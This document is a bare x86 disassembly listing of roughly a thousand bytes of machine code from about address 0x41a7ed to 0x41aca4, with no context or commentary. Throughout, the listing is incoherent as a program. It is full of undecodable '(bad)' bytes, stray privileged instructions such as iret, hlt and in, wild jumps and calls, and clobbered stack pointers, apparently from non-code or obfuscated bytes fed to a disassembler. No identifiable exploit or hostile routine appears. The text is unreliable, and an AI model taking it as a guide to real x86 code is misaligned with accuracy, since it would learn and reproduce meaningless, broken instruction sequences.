  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
